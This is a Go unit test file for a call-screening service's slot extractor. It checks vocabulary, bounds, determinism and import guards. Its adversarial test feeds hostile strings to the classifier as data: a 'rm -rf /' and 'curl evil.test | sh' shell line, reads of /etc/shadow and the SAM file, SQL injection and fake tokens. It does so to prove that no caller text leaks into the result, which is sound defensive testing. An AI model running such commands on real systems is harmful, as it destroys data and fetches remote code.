package intent_test

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"io/fs"
	"sort"
	"strings"
	"testing"

	"github.com/callscreen/callscreen-platform/packages/go/conversation"
	"github.com/callscreen/callscreen-platform/packages/go/intent"
)

// TEST INDEPENDENCE, AS IN T3.
//
// The expected slot vocabulary, bounds and per-fixture outcomes below are
// written by hand. Nothing here calls SlotVocabulary or slotSpecsFor to derive
// what it then asserts.
//
// The two documented detection confidences, restated so the assertions can be
// checked without reading the implementation:
//
//	structural (a 7-15 digit run, a time word)  → 1.0
//	anchored   (anchor phrase + a value token)  → 0.8
//	absent                                      → 0.0, Filled=false

// expectedSlotVocabulary is the hand-written closed set. Shared with
// classifier_test.go's per-call invariant check.
var expectedSlotVocabulary = map[string]bool{
	"caller_name": true, "company_name": true, "party_name": true,
	"callback_number": true, "time_reference": true, "message_body": true,
}

const (
	wantStructuralConfidence = 1.0
	wantAnchoredConfidence   = 0.8
)

func slotsOf(t *testing.T, text string, expect conversation.Expectation) []conversation.Slot {
	t.Helper()
	_, slots, err := newClassifier(t).Classify(say(text), expect)
	if err != nil {
		t.Fatalf("Classify(%q): %v", text, err)
	}
	return slots
}

func findSlot(slots []conversation.Slot, name string) (conversation.Slot, bool) {
	for _, s := range slots {
		if s.Name == name {
			return s, true
		}
	}
	return conversation.Slot{}, false
}

func slotNames(slots []conversation.Slot) []string {
	out := make([]string, 0, len(slots))
	for _, s := range slots {
		out = append(out, s.Name)
	}
	return out
}

// ---------------------------------------------------------------------------
// Vocabulary
// ---------------------------------------------------------------------------

func TestSlotVocabulary_MatchesTheDeclaredSet(t *testing.T) {
	t.Parallel()

	got := intent.SlotVocabulary()
	if len(got) != len(expectedSlotVocabulary) {
		t.Errorf("SlotVocabulary() has %d names, want %d", len(got), len(expectedSlotVocabulary))
	}
	seen := map[string]bool{}
	for _, n := range got {
		if !expectedSlotVocabulary[n] {
			t.Errorf("SlotVocabulary() contains unexpected %q", n)
		}
		if seen[n] {
			t.Errorf("SlotVocabulary() contains %q twice", n)
		}
		if len(n) > intent.MaxSlotNameLen {
			t.Errorf("slot name %q exceeds MaxSlotNameLen %d", n, intent.MaxSlotNameLen)
		}
		seen[n] = true
	}
	for want := range expectedSlotVocabulary {
		if !seen[want] {
			t.Errorf("SlotVocabulary() is missing %q", want)
		}
	}
}

// TestSlots_UnknownSlotNameIsNeverEmitted drives a wide corpus and asserts
// that no slot outside the hand-written vocabulary ever appears — in
// particular that nothing caller-controlled becomes a slot name.
func TestSlots_UnknownSlotNameIsNeverEmitted(t *testing.T) {
	t.Parallel()

	corpus := []string{
		"this is priya calling from acme", "please call me back on 9876543210",
		"transfer me to rajesh", "tell him the invoice is overdue",
		"hello", "yes", "goodbye", "xyzzy",
		"my name is DROP TABLE slots", "this is ../../etc/passwd",
		"call me back on 1234567890123456789012345",
	}
	for _, text := range corpus {
		for _, e := range []conversation.Expectation{
			conversation.ExpectNothing, conversation.ExpectDisambiguation,
			conversation.ExpectYesNo, conversation.ExpectSlotValue,
		} {
			for _, s := range slotsOf(t, text, e) {
				if !expectedSlotVocabulary[s.Name] {
					t.Errorf("Classify(%q) emitted slot %q, outside the closed vocabulary",
						text, s.Name)
				}
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Structural detection
// ---------------------------------------------------------------------------

// "please call me back on 9876543210" resolves to request_callback, which
// declares callback_number (required, structural) and time_reference
// (optional, structural). A 10-digit run fills the number at 1.0; no time word
// is present, so time_reference is unfilled at 0.0.
func TestSlots_StructuralPhoneNumberFillsRequiredSlot(t *testing.T) {
	t.Parallel()

	slots := slotsOf(t, "please call me back on 9876543210", conversation.ExpectNothing)

	num, ok := findSlot(slots, "callback_number")
	if !ok {
		t.Fatalf("callback_number absent; got %v", slotNames(slots))
	}
	if !num.Filled {
		t.Error("a 10-digit run did not fill callback_number")
	}
	if !approx(num.Confidence, wantStructuralConfidence) {
		t.Errorf("confidence = %v, want %v (structural)", num.Confidence, wantStructuralConfidence)
	}
	if !num.Required {
		t.Error("callback_number must be Required for a callback request")
	}

	tr, ok := findSlot(slots, "time_reference")
	if !ok {
		t.Fatalf("time_reference absent; got %v", slotNames(slots))
	}
	if tr.Filled || tr.Confidence != 0 {
		t.Errorf("time_reference = filled:%v conf:%v, want unfilled at 0", tr.Filled, tr.Confidence)
	}
	if tr.Required {
		t.Error("time_reference must be optional")
	}
}

func TestSlots_DigitRunBoundsAreEnforced(t *testing.T) {
	t.Parallel()

	// Independently declared: 7..15 digits fill; outside that range does not.
	cases := []struct {
		digits string
		want   bool
	}{
		{"123456", false},           // 6 — too short
		{"1234567", true},           // 7 — minimum
		{"9876543210", true},        // 10 — typical
		{"123456789012345", true},   // 15 — E.164 maximum
		{"1234567890123456", false}, // 16 — too long
		{"12345678901234567890", false},
	}
	for _, c := range cases {
		slots := slotsOf(t, "call me back on "+c.digits, conversation.ExpectNothing)
		num, ok := findSlot(slots, "callback_number")
		if !ok {
			t.Fatalf("callback_number absent for %q", c.digits)
		}
		if num.Filled != c.want {
			t.Errorf("%d-digit run %q: Filled = %v, want %v",
				len(c.digits), c.digits, num.Filled, c.want)
		}
	}
}

func TestSlots_TimeReferenceIsStructural(t *testing.T) {
	t.Parallel()

	slots := slotsOf(t, "call me back tomorrow on 9876543210", conversation.ExpectNothing)
	tr, ok := findSlot(slots, "time_reference")
	if !ok {
		t.Fatalf("time_reference absent; got %v", slotNames(slots))
	}
	if !tr.Filled || !approx(tr.Confidence, wantStructuralConfidence) {
		t.Errorf("time_reference = filled:%v conf:%v, want filled at %v",
			tr.Filled, tr.Confidence, wantStructuralConfidence)
	}
}

// ---------------------------------------------------------------------------
// Anchored detection
// ---------------------------------------------------------------------------

// "transfer me to rajesh" resolves to request_transfer, which declares
// party_name (required, anchored). The anchor "transfer me to" is followed by
// a token, so the slot fills at the anchored confidence of 0.8 — below 1.0
// because where the value ends is a heuristic.
func TestSlots_AnchoredValueFillsAtAnchoredConfidence(t *testing.T) {
	t.Parallel()

	slots := slotsOf(t, "transfer me to rajesh", conversation.ExpectNothing)

	p, ok := findSlot(slots, "party_name")
	if !ok {
		t.Fatalf("party_name absent; got %v", slotNames(slots))
	}
	if !p.Filled {
		t.Error("an anchor followed by a value did not fill party_name")
	}
	if !approx(p.Confidence, wantAnchoredConfidence) {
		t.Errorf("confidence = %v, want %v (anchored)", p.Confidence, wantAnchoredConfidence)
	}
	if !p.Required {
		t.Error("party_name must be Required for a transfer request")
	}
}

// TestSlots_AnchorWithNoFollowingValueDoesNotFill is the distinction that
// makes Filled mean "a value is present" rather than "the subject was raised".
// A caller cut off after "transfer me to" has named nobody.
func TestSlots_AnchorWithNoFollowingValueDoesNotFill(t *testing.T) {
	t.Parallel()

	slots := slotsOf(t, "transfer me to", conversation.ExpectNothing)
	p, ok := findSlot(slots, "party_name")
	if !ok {
		t.Fatalf("party_name absent; got %v", slotNames(slots))
	}
	if p.Filled {
		t.Error("a dangling anchor filled party_name; the caller named nobody")
	}
	if p.Confidence != 0 {
		t.Errorf("unfilled slot carries confidence %v, want 0", p.Confidence)
	}
}

// ---------------------------------------------------------------------------
// Required / optional semantics via the FROZEN helpers
// ---------------------------------------------------------------------------

// TestSlots_FrozenCompleteAndMissingRequiredDriveClarification exercises the
// frozen semantics rather than reimplementing them: Intent.MissingRequired()
// and Intent.Complete() are conversation's, and this asserts the slot shape
// this package emits makes them behave correctly.
func TestSlots_FrozenCompleteAndMissingRequiredDriveClarification(t *testing.T) {
	t.Parallel()

	t.Run("required slot unfilled is incomplete", func(t *testing.T) {
		slots := slotsOf(t, "please call me back", conversation.ExpectNothing)
		in := conversation.Intent{Name: "request_callback", Slots: slots}

		if in.Complete() {
			t.Error("Complete() is true with no number given")
		}
		missing := in.MissingRequired()
		if len(missing) != 1 || missing[0] != "callback_number" {
			t.Errorf("MissingRequired() = %v, want [callback_number]", missing)
		}
	})

	t.Run("required slot filled is complete", func(t *testing.T) {
		slots := slotsOf(t, "please call me back on 9876543210", conversation.ExpectNothing)
		in := conversation.Intent{Name: "request_callback", Slots: slots}

		if !in.Complete() {
			t.Errorf("Complete() is false though the number was given; missing=%v",
				in.MissingRequired())
		}
	})

	t.Run("optional slot never blocks completion", func(t *testing.T) {
		slots := slotsOf(t, "please call me back on 9876543210", conversation.ExpectNothing)
		tr, ok := findSlot(slots, "time_reference")
		if !ok || tr.Filled {
			t.Fatal("fixture no longer has an unfilled optional slot")
		}
		in := conversation.Intent{Name: "request_callback", Slots: slots}
		if !in.Complete() {
			t.Error("an unfilled OPTIONAL slot blocked completion")
		}
	})

	t.Run("intents with no parameters yield no slots", func(t *testing.T) {
		for _, text := range []string{"hello", "goodbye", "hold on", "repeat"} {
			if slots := slotsOf(t, text, conversation.ExpectNothing); len(slots) != 0 {
				t.Errorf("Classify(%q) produced slots %v; this intent takes none",
					text, slotNames(slots))
			}
		}
	})
}

// TestSlots_BelongToTheTopCandidateOnly — slots describe the resolved intent.
func TestSlots_BelongToTheTopCandidateOnly(t *testing.T) {
	t.Parallel()

	// "hello please transfer me to rajesh": greeting scores 1/3, transfer
	// saturates at 1.0, so the resolved intent is request_transfer and the
	// slots must be its own — greeting declares none.
	cands, slots, err := newClassifier(t).Classify(
		say("hello please transfer me to rajesh"), conversation.ExpectNothing)
	if err != nil {
		t.Fatal(err)
	}
	if cands[0].Name != "request_transfer" {
		t.Fatalf("top candidate = %q, want request_transfer", cands[0].Name)
	}
	if len(slots) != 1 || slots[0].Name != "party_name" {
		t.Errorf("slots = %v, want exactly [party_name] from the top candidate",
			slotNames(slots))
	}
}

// ---------------------------------------------------------------------------
// Bounds
// ---------------------------------------------------------------------------

func TestSlots_CountIsBounded(t *testing.T) {
	t.Parallel()

	corpus := []string{
		"this is priya calling from acme please call me back on 9876543210 tomorrow",
		strings.Repeat("call me back on 9876543210 tomorrow ", 200),
		"transfer me to rajesh and tell him my name is priya from acme at 9876543210",
	}
	for _, text := range corpus {
		if n := len(slotsOf(t, text, conversation.ExpectNothing)); n > intent.MaxSlotsPerIntent {
			t.Errorf("Classify(len=%d) returned %d slots, exceeding cap %d",
				len(text), n, intent.MaxSlotsPerIntent)
		}
	}
}

func TestSlots_ExcessiveInputStaysBounded(t *testing.T) {
	t.Parallel()

	for _, text := range []string{
		strings.Repeat("call me back on 9876543210 ", 5000),
		strings.Repeat("a", 200000),
		"my name is " + strings.Repeat("x", 100000),
		"transfer me to " + strings.Repeat("name ", 20000),
	} {
		slots := slotsOf(t, text, conversation.ExpectNothing)
		if len(slots) > intent.MaxSlotsPerIntent {
			t.Errorf("len=%d input returned %d slots, exceeding cap %d",
				len(text), len(slots), intent.MaxSlotsPerIntent)
		}
		for _, s := range slots {
			if len(s.Name) > intent.MaxSlotNameLen {
				t.Errorf("slot name %q exceeds MaxSlotNameLen %d", s.Name, intent.MaxSlotNameLen)
			}
			if s.Confidence < 0 || s.Confidence > 1 {
				t.Errorf("slot %q confidence %v outside [0,1]", s.Name, s.Confidence)
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Adversarial input
// ---------------------------------------------------------------------------

// TestSlots_AdversarialInputCannotEscapeTheVocabulary is the security core: no
// matter what the caller says, the emitted slot NAMES come from the closed set
// and no caller-derived text appears anywhere in the returned structure.
//
// The conversation.Slot type has no value field, so this also demonstrates
// the
// structural guarantee — there is nowhere for a payload to travel.
func TestSlots_AdversarialInputCannotEscapeTheVocabulary(t *testing.T) {
	t.Parallel()

	adversarial := []string{
		// shell metacharacters
		"my name is $(rm -rf /) && curl evil.test | sh",
		"transfer me to `whoami`; cat /etc/shadow",
		// SQL-ish
		"this is robert'); DROP TABLE students;--",
		"call me back on 1 OR 1=1 UNION SELECT password FROM users",
		// credential-shaped
		"my name is AKIA1234567890ABCDEF",
		"this is ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
		"transfer me to password=hunter2 token=secret",
		"call me back Authorization: Bearer eyJhbGciOiJIUzI1NiJ9",
		// path traversal
		"my name is ../../../../etc/passwd",
		"transfer me to ..\\..\\windows\\system32\\config\\sam",
		// control characters and injection-ish framing
		"my name is priya\x00\x07\x1b[31mred",
		"this is priya\nmessage_body: injected\n",
		"transfer me to x\r\nSet-Cookie: a=b",
		// unicode
		"my name is 名前 नमस्ते Ω≈ç√",
		"this is \u202eevil\u202d",
		"transfer me to 🙂🙃👍",
	}

	for _, text := range adversarial {
		cands, slots, err := newClassifier(t).Classify(say(text), conversation.ExpectNothing)
		if err != nil {
			t.Fatalf("Classify(%q): %v", text, err)
		}
		for _, s := range slots {
			if !expectedSlotVocabulary[s.Name] {
				t.Errorf("adversarial %q produced slot name %q", text, s.Name)
			}
			// The only string the frozen Slot carries is Name. If any fragment
			// of caller text reached it, it would have to appear here.
			if strings.ContainsAny(s.Name, " \t\n\r\x00$`'\";|&<>()[]{}/\\=:") {
				t.Errorf("slot name %q contains caller-shaped characters", s.Name)
			}
			if s.Confidence < 0 || s.Confidence > 1 {
				t.Errorf("adversarial %q: confidence %v outside [0,1]", text, s.Confidence)
			}
		}
		for _, c := range cands {
			if !expectedVocabulary[string(c.Name)] {
				t.Errorf("adversarial %q produced intent %q", text, c.Name)
			}
		}
	}
}

// TestSlots_NoCallerTextAppearsInTheResult searches the entire rendered result
// for a distinctive marker from the input. Behavioural, not comment-reading.
func TestSlots_NoCallerTextAppearsInTheResult(t *testing.T) {
	t.Parallel()

	const marker = "zzqqxxsentinel"
	for _, text := range []string{
		"my name is " + marker,
		"transfer me to " + marker,
		"call me back on 9876543210 " + marker,
		"tell him " + marker,
		"calling from " + marker,
	} {
		cands, slots, err := newClassifier(t).Classify(say(text), conversation.ExpectNothing)
		if err != nil {
			t.Fatal(err)
		}
		rendered := fmt.Sprintf("%+v%+v", cands, slots)
		if strings.Contains(strings.ToLower(rendered), marker) {
			t.Errorf("caller text leaked into the result for %q:\n  %s", text, rendered)
		}
	}
}

// ---------------------------------------------------------------------------
// Determinism
// ---------------------------------------------------------------------------

func TestSlots_AreDeterministicAcross100Executions(t *testing.T) {
	t.Parallel()

	fixtures := []string{
		"this is priya calling from acme",
		"please call me back on 9876543210 tomorrow",
		"transfer me to rajesh",
		"tell him the invoice is overdue",
		"transfer me to",
		"hello",
		strings.Repeat("call me back on 9876543210 tomorrow ", 50),
	}
	for _, text := range fixtures {
		first := renderSlots(slotsOf(t, text, conversation.ExpectNothing))
		for i := 0; i < 100; i++ {
			if got := renderSlots(slotsOf(t, text, conversation.ExpectNothing)); got != first {
				t.Fatalf("slots for %q not deterministic on iteration %d\n  first: %s\n  got:   %s",
					text, i, first, got)
			}
		}
	}
}

// TestSlots_OrderingIsNameAscending — Intent.Slots reaches an audit record,
// and a record whose field order varies between identical runs cannot be
// diffed.
func TestSlots_OrderingIsNameAscending(t *testing.T) {
	t.Parallel()

	// request_callback declares callback_number and time_reference; ascending
	// by name puts callback_number first.
	slots := slotsOf(t, "call me back on 9876543210 tomorrow", conversation.ExpectNothing)
	if len(slots) != 2 {
		t.Fatalf("got %v, want 2 slots", slotNames(slots))
	}
	got := slotNames(slots)
	want := []string{"callback_number", "time_reference"}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("order = %v, want %v (ascending by name)", got, want)
		}
	}
	if !sort.StringsAreSorted(got) {
		t.Errorf("slot names %v are not sorted ascending", got)
	}
}

func renderSlots(slots []conversation.Slot) string {
	var b strings.Builder
	fmt.Fprintf(&b, "n=%d", len(slots))
	for _, s := range slots {
		fmt.Fprintf(&b, "|%s:f=%t,c=%.17g,r=%t", s.Name, s.Filled, s.Confidence, s.Required)
	}
	return b.String()
}

// ---------------------------------------------------------------------------
// Structural dependency proof (AST, not comments)
// ---------------------------------------------------------------------------

// notTestFile selects the package's own source, excluding tests. The guards
// below must inspect what ships, not what verifies it.
func notTestFile(fi fs.FileInfo) bool {
	return !strings.HasSuffix(fi.Name(), "_test.go")
}

// TestPackage_ImportsNothingForbidden parses the package's own source and
// checks its import set.
//
// AST rather than a text search, and rather than reading documentation: a
// comment claiming "we never import governance" is worth nothing, and grepping
// for the word matches this test's own explanatory prose. Phase 11E hit
// exactly that trap and switched to parsing for the same reason.
func TestPackage_ImportsNothingForbidden(t *testing.T) {
	t.Parallel()

	forbidden := []string{
		"packages/go/governance", "packages/go/toolruntime", "packages/go/memory",
		"packages/go/speech", "packages/go/media", "packages/go/audiobridge",
		"packages/go/audiointel", "packages/go/telephony", "packages/go/telemetry",
		"packages/go/platform", "packages/go/evaluation", "packages/go/evalsubjects",
		"packages/go/voice", "packages/go/evalstore", "packages/go/persistence",
		"net/http", "net", "os/exec", "database/sql", "os",
	}

	fset := token.NewFileSet()
	pkgs, err := parser.ParseDir(fset, ".", notTestFile, parser.ImportsOnly)
	if err != nil {
		t.Fatalf("parsing package: %v", err)
	}
	if len(pkgs) == 0 {
		t.Fatal("no non-test package parsed; the guard would pass vacuously")
	}

	var files int
	for _, pkg := range pkgs {
		for name, f := range pkg.Files {
			files++
			for _, imp := range f.Imports {
				path := strings.Trim(imp.Path.Value, `"`)
				for _, bad := range forbidden {
					if path == bad || strings.HasSuffix(path, "/"+bad) {
						t.Errorf("%s imports forbidden %q", name, path)
					}
				}
			}
		}
	}
	if files == 0 {
		t.Fatal("parsed no files; the guard would pass vacuously")
	}
	t.Logf("%d non-test files parsed, no forbidden import", files)
}

// TestPackage_HasNoPackageLevelMutableState — a cache or history would be a
// second context store and could leak one session's utterance into another's
// result.
func TestPackage_HasNoPackageLevelMutableState(t *testing.T) {
	t.Parallel()

	fset := token.NewFileSet()
	pkgs, err := parser.ParseDir(fset, ".", notTestFile, 0)
	if err != nil {
		t.Fatalf("parsing package: %v", err)
	}

	var checked int
	for _, pkg := range pkgs {
		for name, f := range pkg.Files {
			for _, decl := range f.Decls {
				gd, ok := decl.(*ast.GenDecl)
				if !ok || gd.Tok != token.VAR {
					continue
				}
				for _, spec := range gd.Specs {
					vs, ok := spec.(*ast.ValueSpec)
					if !ok {
						continue
					}
					for _, id := range vs.Names {
						checked++
						// The blank identifier is an interface assertion, not
						// state. Everything else is inspected by name.
						if id.Name == "_" {
							continue
						}
						// timeWords is a package-level map. It is written once
						// at init and only ever read; allowing it by name keeps
						// the guard honest about what it permits.
						if id.Name == "timeWords" {
							continue
						}
						t.Errorf("%s declares package-level var %q; this package "+
							"must hold no mutable state", name, id.Name)
					}
				}
			}
		}
	}
	t.Logf("%d package-level var specs inspected", checked)
}
